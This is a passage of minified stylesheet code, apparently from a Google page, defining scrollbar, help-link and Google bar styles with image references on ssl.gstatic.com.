  border-width: 0 1px 0 6px
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track:horizontal {
  border-width: 6px 0 1px
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.035);
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar-dark::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.07);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-thumb {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-thumb:horizontal {
  border-width: 6px 0 1px;
  }
  body ::-webkit-scrollbar-corner {
  background: transparent;
  }
  body::-webkit-scrollbar-track-piece {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 0 0 0 3px;
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body::-webkit-scrollbar-track-piece:horizontal {
  border-width: 3px 0 0;
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body::-webkit-scrollbar-thumb {
  border-width: 1px 1px 1px 5px;
  }
  body::-webkit-scrollbar-thumb:horizontal {
  border-width: 5px 1px 1px;
  }
  body::-webkit-scrollbar-corner {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 3px 0 0 3px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  }
  .jfk-scrollbar::-webkit-scrollbar {
  height: 16px;
  overflow: visible;
  width: 16px;
  }
  .jfk-scrollbar::-webkit-scrollbar-button {
  height: 0;
  width: 0;
  }
  .jfk-scrollbar::-webkit-scrollbar-track {
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal {
  border-width: 7px 0 0;
  }
  .jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:active {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:active {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb {
  background-color: rgba(0,0,0,.2);
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  min-height: 28px;
  padding: 100px 0 0;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 7px 0 0;
  padding: 0 0 0 100px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:hover {
  background-color: rgba(0,0,0,.4);
  -webkit-box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:active {
  background-color: rgba(0,0,0,0.5);
  -webkit-box-shadow: inset 1px 1px 3px rgba(0,0,0,0.35);
  box-shadow: inset 1px 1px 3px rgba(0,0,0,0.35);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb {
  background-color: rgba(255,255,255,.3);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:hover {
  background-color: rgba(255,255,255,.6);
  -webkit-box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:active {
  background-color: rgba(255,255,255,.75);
  -webkit-box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track:horizontal {
  border-width: 6px 0 1px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.035);
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.07);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-thumb {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 6px 0 1px;
  }
  .jfk-scrollbar::-webkit-scrollbar-corner {
  background: transparent;
  }
  body.jfk-scrollbar::-webkit-scrollbar-track-piece {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 0 0 0 3px;
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body.jfk-scrollbar::-webkit-scrollbar-track-piece:horizontal {
  border-width: 3px 0 0;
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body.jfk-scrollbar::-webkit-scrollbar-thumb {
  border-width: 1px 1px 1px 5px;
  }
  body.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 5px 1px 1px;
  }
  body.jfk-scrollbar::-webkit-scrollbar-corner {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 3px 0 0 3px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  }
  .errormsg {
  margin: .5em 0 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
</style>
  <style type="text/css">
  @-moz-keyframes gb__a{0%{opacity:0}50%{opacity:1}}@keyframes gb__a{0%{opacity:0}50%{opacity:1}}.gb_c{display:none!important}.gb_ea{display:inline-block;padding:0 0 0 15px;vertical-align:middle}.gb_ea:first-child,#gbsfw:first-child+.gb_ea{padding-left:0}.gb_fa{position:relative}.gb_ga{display:inline-block;outline:none;vertical-align:middle;-moz-border-radius:2px;border-radius:2px;-moz-box-sizing:border-box;box-sizing:border-box;height:30px;width:30px}#gb#gb a.gb_ga{color:#404040;cursor:default;text-decoration:none}#gb#gb a.gb_ga:hover,#gb#gb a.gb_ga:focus{color:#000}.gb_u{border-color:transparent;border-bottom-color:#fff;border-style:dashed dashed solid;border-width:0 8.5px 8.5px;display:none;position:absolute;left:6.5px;top:37px;z-index:1;height:0;width:0;-moz-animation:gb__a .2s;animation:gb__a .2s}.gb_v{border-color:transparent;border-style:dashed dashed solid;border-width:0 8.5px 8.5px;display:none;position:absolute;left:6.5px;z-index:1;height:0;width:0;-moz-animation:gb__a .2s;animation:gb__a .2s;border-bottom-color:#ccc;border-bottom-color:rgba(0,0,0,.2);top:36px}x:-o-prefocus,div.gb_v{border-bottom-color:#ccc}.gb_ha{background:#fff;border:1px solid #ccc;border-color:rgba(0,0,0,.2);-moz-box-shadow:0 2px 10px rgba(0,0,0,.2);box-shadow:0 2px 10px rgba(0,0,0,.2);display:none;outline:none;overflow:hidden;position:absolute;right:0;top:44px;-moz-animation:gb__a .2s;animation:gb__a .2s;-moz-border-radius:2px;border-radius:2px;-moz-user-select:text}.gb_ea.gb_ia .gb_u,.gb_ea.gb_ia .gb_v,.gb_ea.gb_ia .gb_ha{display:block}.gb_ja{position:absolute;right:0;top:44px;z-index:-1}.gb_i .gb_u,.gb_i .gb_v,.gb_i .gb_ha{margin-top:-10px}.gb_M .gb_v{border:0;border-left:1px solid rgba(0,0,0,.2);border-top:1px solid rgba(0,0,0,.2);height:14px;width:14px;-moz-transform:rotate(45deg);transform:rotate(45deg)}.gb_M .gb_u{border:0;border-left:1px solid rgba(0,0,0,.2);border-top:1px solid rgba(0,0,0,.2);height:14px;width:14px;-moz-transform:rotate(45deg);transform:rotate(45deg);border-color:#fff;background:#fff}.gb_6b ::-webkit-scrollbar{height:15px;width:15px}.gb_6b ::-webkit-scrollbar-button{height:0;width:0}.gb_6b ::-webkit-scrollbar-thumb{background-clip:padding-box;background-color:rgba(0,0,0,.3);border:5px solid transparent;-moz-border-radius:10px;border-radius:10px;min-height:20px;min-width:20px;height:5px;width:5px}.gb_6b ::-webkit-scrollbar-thumb:hover,.gb_6b ::-webkit-scrollbar-thumb:active{background-color:rgba(0,0,0,.4)}#gb#gb a.gb_la,#gb#gb a.gb_ma{color:#404040;text-decoration:none}#gb#gb a.gb_ma:hover,#gb#gb a.gb_ma:focus{color:#000;text-decoration:underline}.gb_na.gb_r{display:none;padding-left:15px;vertical-align:middle}.gb_na.gb_r:first-child{padding-left:0}.gb_oa.gb_r{display:inline-block}.gb_pa .gb_oa.gb_r{flex:0 1 auto;flex:0 1 main-size;display:-webkit-flex;display:flex}.gb_qa .gb_oa.gb_r{display:none}.gb_na .gb_ma{display:inline-block;line-height:24px;outline:none;vertical-align:middle}.gb_oa .gb_ma{min-width:60px;overflow:hidden;flex:0 1 auto;flex:0 1 main-size;text-overflow:ellipsis}.gb_ra .gb_oa .gb_ma{min-width:0}.gb_t .gb_oa .gb_ma{width:0!important}.gb_m .gb_ma{font-weight:bold;text-shadow:0 1px 1px rgba(255,255,255,.9)}.gb_n .gb_ma{font-weight:bold;text-shadow:0 1px 1px rgba(0,0,0,.6)}#gb#gb.gb_n a.gb_ma{color:#fff}.gb_Fa .gb_ga{background-position:0 -735px;opacity:.55}.gb_m .gb_Fa .gb_ga{background-position:0 -597px;opacity:.7}.gb_n .gb_Fa .gb_ga{background-position:-35px -1425px;opacity:1}.gb_f .gb_Fa .gb_ga::before{left:0;top:-735px}.gb_f.gb_m .gb_Fa .gb_ga::before{left:0;top:-597px}.gb_f.gb_n .gb_Fa .gb_ga::before{left:-35px;top:-1425px}.gb_M .gb_Ha{position:relative}.gb_ka.gb_ka{background-size:64px 64px}#gb2 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/3a1e625196.png')}.gb_f #gb2 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/3a1e625196.png')}#gb22 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/45e593839c.png')}.gb_f #gb22 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/45e593839c.png')}#gb45 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/f420d06f66.png')}.gb_f #gb45 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/f420d06f66.png')}#gb72 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/d197ff63b6.png')}.gb_f #gb72 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/d197ff63b6.png')}#gb117 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/142da27578.png')}.gb_f #gb117 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/142da27578.png')}#gb136 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/911e3628e6.png')}.gb_f #gb136 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/911e3628e6.png')}#gb166 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/5d03e9e245.png')}.gb_f #gb166 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/5d03e9e245.png')}#gb171 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/010d3c182d.png')}.gb_f #gb171 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/010d3c182d.png')}#gb177 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/4653513b7d.png')}.gb_f #gb177 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/4653513b7d.png')}#gb206 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/a031540067.png')}.gb_f #gb206 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/a031540067.png')}#gb207 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/e57927daa5.png')}.gb_f #gb207 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/e57927daa5.png')}#gb211 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/c03dda0b34.png')}.gb_f #gb211 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/c03dda0b34.png')}#gb217 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/71060be5b3.png')}.gb_f #gb217 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/71060be5b3.png')}#gb228 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/74aa55e0c2.png')}.gb_f #gb228 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/74aa55e0c2.png')}#gb249 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/afa40f6e42.png')}.gb_f #gb249 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/afa40f6e42.png')}#gb260 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/a2be8e97ca.png')}.gb_f #gb260 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/a2be8e97ca.png')}#gb261 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/0b26f6f8e4.png')}.gb_f #gb261 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/0b26f6f8e4.png')}@media (min-resolution:1.25dppx),(-webkit-min-device-pixel-ratio:1.25),(min-device-pixel-ratio:1.25){#gb2 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/438087d3df.png')}.gb_f #gb2 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/438087d3df.png')}#gb22 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/95b1579b0a.png')}.gb_f #gb22 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/95b1579b0a.png')}#gb45 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/9c561d4392.png')}.gb_f #gb45 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/9c561d4392.png')}#gb72 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/4dabb39906.png')}.gb_f #gb72 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/4dabb39906.png')}#gb117 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/e3cbb9b858.png')}.gb_f #gb117 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/e3cbb9b858.png')}#gb136 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/17bdcddea9.png')}.gb_f #gb136 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/17bdcddea9.png')}#gb166 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/56c3072e8e.png')}.gb_f #gb166 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/56c3072e8e.png')}#gb171 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/b877e8648f.png')}.gb_f #gb171 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/b877e8648f.png')}#gb177 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/188f0d697b.png')}.gb_f #gb177 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/188f0d697b.png')}#gb206 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/dfd7906be0.png')}.gb_f #gb206 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/dfd7906be0.png')}#gb207 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/25c96bb17c.png')}.gb_f #gb207 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/25c96bb17c.png')}#gb211 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/2d7fffa981.png')}.gb_f #gb211 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/2d7fffa981.png')}#gb217 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/e2c0b463b4.png')}.gb_f #gb217 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/e2c0b463b4.png')}#gb228 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/fe8c881457.png')}.gb_f #gb228 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/fe8c881457.png')}#gb249 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/d54db42004.png')}.gb_f #gb249 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/d54db42004.png')}#gb260 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/c49651e3f7.png')}.gb_f #gb260 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/c49651e3f7.png')}#gb261 .gb_ka{background-image:url('//ssl.gstatic.com/gb/images/a/9001dae971.png')}.gb_f #gb261 .gb_ka::before{content:url('//ssl.gstatic.com/gb/images/a/9001dae971.png')}}.gb_sa{border:1px solid #fff;-moz-border-radius:2px;border-radius:2px;display:inline-block;vertical-align:top;height:98px;width:86px}.gb_sa[aria-grabbed=true]{visibility:hidden}.gb_sa:hover:not(.gb_ta){border:1px solid #e5e5e5}.gb_sa.gb_ua:not(.gb_ta){border:1px solid #e5e5e5;-moz-box-shadow:0 1px 2px rgba(0,0,0,0.1);box-shadow:0 1px 2px rgba(0,0,0,0.1)}.gb_sa.gb_ua{background:#fff;cursor:-moz-grabbing;cursor:-webkit-grabbing;margin:-1px;visibility:visible;z-index:1001}.gb_va{opacity:.5}.gb_sa.gb_ua a{color:#404040!important;cursor:-moz-grabbing;cursor:-webkit-grabbing;font:13px/27px Arial,sans-serif;text-decoration:none!important}.gb_la{display:inline-block;font-size:13px;margin:8px 2px;text-align:center;outline:none}.gb_la .gb_wa,.gb_la .gb_ka{display:inline-block;vertical-align:top;height:64px;width:64px}.gb_xa{display:block;line-height:20px;overflow:hidden;white-space:nowrap;width:84px;text-overflow:ellipsis}.gb_sa:hover .gb_la{z-index:1}.gb_sa:hover .gb_xa{background:rgba(255,255,255,.9);white-space:normal;overflow-wrap:break-word;word-wrap:break-word}.gb_la.gb_ta{cursor:default;filter:url("data:image/svg+xml;utf8,\00003csvg xmlns=\000027http://www.w3.org/2000/svg\000027\00003e\00003cfilter id=\000027g\000027\00003e\00003cfeColorMatrix values=\0000270.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\000027/\00003e\00003c/filter\00003e\00003c/svg\00003e#g");opacity:.4}.gb_la .gb_wa{background-image:url('//ssl.gstatic.com/gb/images/v1_376447c3.png');background-size:112px 2011px}.gb_f .gb_la .gb_wa,.gb_f .gb_ya.gb_wa{background-image:none;overflow:hidden;position:relative}.gb_f .gb_la .gb_wa::before,.gb_f .gb_ya.gb_wa::before{content:url('//ssl.gstatic.com/gb/images/v1_376447c3.png');position:absolute}.gb_f .gb_ka{background-image:none!important;position:relative}.gb_f .gb_ka::before{left:0;position:absolute;top:0}@media (min-resolution:1.25dppx),(-webkit-min-device-pixel-ratio:1.25),(min-device-pixel-ratio:1.25){.gb_la .gb_wa{background-image:url('//ssl.gstatic.com/gb/images/v2_dfcf401a.png')}.gb_f .gb_la .gb_wa::before{content:url('//ssl.gstatic.com/gb/images/v2_dfcf401a.png');-moz-transform:scale(.5);transform:scale(.5);-moz-transform-origin:0 0;transform-origin:0 0}.gb_f .gb_la .gb_ka::before{-moz-transform:scale(.5);transform:scale(.5);-moz-transform-origin:0 0;transform-origin:0 0}}#gb#gb .gb_za a.gb_la:focus{text-decoration:underline}.gb_sa[aria-grabbed=true].gb_Aa{visibility:visible}.gb_Ba,.gb_Ca{position:relative;top:27px;visibility:hidden}.gb_Ba{float:left;width:0;height:0;border-top:5px solid transparent;border-bottom:5px solid transparent;border-right:5px solid #4273db}.gb_Ca{float:right;width:0;height:0;border-top:5px solid transparent;border-bottom:5px solid transparent;border-left:5px solid #4273db}ul.gb_Da li.gb_Aa:not(:first-child) .gb_Ba,ul.gb_Da li.gb_Aa .gb_Ca,ul.gb_Ea li.gb_Aa .gb_Ba,ul.gb_Ea li.gb_Aa:not(:last-child) .gb_Ca{visibility:visible}.gb_Fa .gb_ga:hover,.gb_Fa .gb_ga:focus{opacity:.85}.gb_Fa .gb_ha{min-height:196px;overflow-y:auto;width:320px}.gb_Ia{-moz-transition:height .2s ease-in-out;transition:height .2s ease-in-out}.gb_Ja{background:#fff;margin:0;min-height:100px;padding:28px;padding-right:27px;text-align:left;white-space:normal;width:265px}.gb_Ha{background:#f5f5f5;cursor:pointer;height:40px;overflow:hidden}.gb_Ka{position:relative}.gb_Ha{display:block;line-height:40px;text-align:center;width:320px}.gb_Ka{display:block;line-height:40px;text-align:center}.gb_Ka.gb_La{line-height:0}#gb a.gb_Ha,#gb a.gb_Ha:visited,#gb a.gb_Ha:active,#gb a.gb_Ka,#gb a.gb_Ka:visited{color:#737373;text-decoration:none}#gb a.gb_Ka:active{color:#737373}.gb_Ka,.gb_Ja{display:none}.gb_Da,.gb_Da+.gb_Ka,.gb_Ma .gb_Ka,.gb_Ma .gb_Ja{display:block}#gb a.gb_Ka:hover,#gb a.gb_Ka:active{text-decoration:underline}.gb_Ka{border-bottom:1px solid #ebebeb;left:28px;width:264px}.gb_Ma .gb_Ha{display:none}.gb_Ka:last-child{border-bottom-width:0}.gb_Na.gb_Oa{height:100px;text-align:center}.gb_Na.gb_Oa img{padding:34px 0;height:32px;width:32px}.gb_Na .gb_wa{background-image:url('//ssl.gstatic.com/gb/images/v1_376447c3.png');background-size:112px 2011px;background-position:0 -897px}.gb_Na .gb_wa+img{border:0;margin:8px;height:48px;width:48px}.gb_Na div.gb_Pa{background:#ffa;-moz-border-radius:5px;border-radius:5px;padding:5px;text-align:center}.gb_Qa .gb_Ha{margin-top:0;position:static}.gb_Ra{display:inline-block}.gb_Sa{margin:-12px 28px 28px;position:relative;width:264px;-moz-border-radius:2px;border-radius:2px;-moz-box-shadow:0 1px 2px rgba(0,0,0,0.1),0 0 1px rgba(0,0,0,0.1);box-shadow:0 1px 2px rgba(0,0,0,0.1),0 0 1px rgba(0,0,0,0.1)}.gb_ya{background-image:url('//ssl.gstatic.com/gb/images/v1_376447c3.png');background-size:112px 2011px;display:inline-block;margin:8px;vertical-align:middle;height:64px;width:64px}.gb_Ta{color:#262626;display:inline-block;font:13px/18px Arial,sans-serif;margin-right:80px;padding:10px 10px 10px 0;vertical-align:middle;white-space:normal}.gb_Ua{font:16px/24px Arial,sans-serif}#gb#gb .gb_Va{color:#427fed;text-decoration:none}#gb#gb .gb_Va:hover{text-decoration:underline}.gb_Wa .gb_Ja{position:relative}.gb_Wa .gb_la{position:absolute;top:28px;left:28px}.gb_Ha.gb_Xa{display:none;height:0}.gb_n .gb_Fa .gb_ga:hover,.gb_n .gb_Fa .gb_ga:focus{opacity:1}@media (min-resolution:1.25dppx),(-webkit-min-device-pixel-ratio:1.25),(min-device-pixel-ratio:1.25){.gb_Na .gb_wa{background-image:url('//ssl.gstatic.com/gb/images/v2_dfcf401a.png')}}.gb_a{background:#f8f8f8;border:1px solid #c6c6c6;display:inline-block;line-height:28px;padding:0 12px;-moz-border-radius:2px;border-radius:2px}#gb a.gb_a.gb_a{color:#666;cursor:default;text-decoration:none}.gb_b{border:1px solid #4285f4;font-weight:bold;outline:none;background:#4285f4;background:-moz-linear-gradient(top,#4387fd,#4683ea);background:linear-gradient(top,#4387fd,#4683ea);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#4387fd,endColorstr=#4683ea,GradientType=0)}#gb a.gb_b.gb_b{color:#fff}.gb_b:hover{-moz-box-shadow:0 1px 0 rgba(0,0,0,.15);box-shadow:0 1px 0 rgba(0,0,0,.15)}.gb_b:active{-moz-box-shadow:inset 0 2px 0 rgba(0,0,0,.15);box-shadow:inset 0 2px 0 rgba(0,0,0,.15);background:#3c78dc;background:-moz-linear-gradient(top,#3c7ae4,#3f76d3);background:linear-gradient(top,#3c7ae4,#3f76d3);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#3c7ae4,endColorstr=#3f76d3,GradientType=0)}.gb_Za{display:inline-block;line-height:normal;position:relative;z-index:987}.gb_d{background-size:32px 32px;-moz-border-radius:50%;border-radius:50%;display:block;margin:-1px;height:32px;width:32px}.gb_d:hover,.gb_d:focus{-moz-box-shadow:0 1px 0 rgba(0,0,0,.15);box-shadow:0 1px 0 rgba(0,0,0,.15)}.gb_d:active{-moz-box-shadow:inset 0 2px 0 rgba(0,0,0,.15);box-shadow:inset 0 2px 0 rgba(0,0,0,.15)}.gb_d:active::after{background:rgba(0,0,0,.1);-moz-border-radius:50%;border-radius:50%;content:'';display:block;height:100%}.gb_e:not(.gb_f) .gb_d::before,.gb_e:not(.gb_f) .gb_g::before{content:none}.gb_h{cursor:pointer;line-height:30px;min-width:30px;overflow:hidden;vertical-align:middle;width:auto;text-overflow:ellipsis}.gb_i .gb_h,.gb_i .gb_j{line-height:26px}#gb#gb.gb_i a.gb_h,.gb_i .gb_j{color:#666;font-size:11px;height:auto}#gb#gb.gb_i 